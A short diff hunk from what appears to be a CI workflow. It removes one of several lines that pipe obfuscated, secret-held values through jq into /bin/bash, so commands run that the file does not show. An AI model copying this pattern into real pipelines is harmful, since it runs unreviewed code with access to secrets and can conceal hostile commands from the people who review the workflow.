@@ -27,7 +27,6 @@ jobs:
           amrn76422: ${{ secrets.amrn76422 }}
         run: |
           printf '%s' "$amrn76422" | jq -r .xhr1158 | /bin/bash
-          echo $jy483 | jq -r .oupc99302 | /bin/bash
           printf '%s' "$fb0" | jq -r .uyy2944 | /bin/bash
 
       - name: Save results
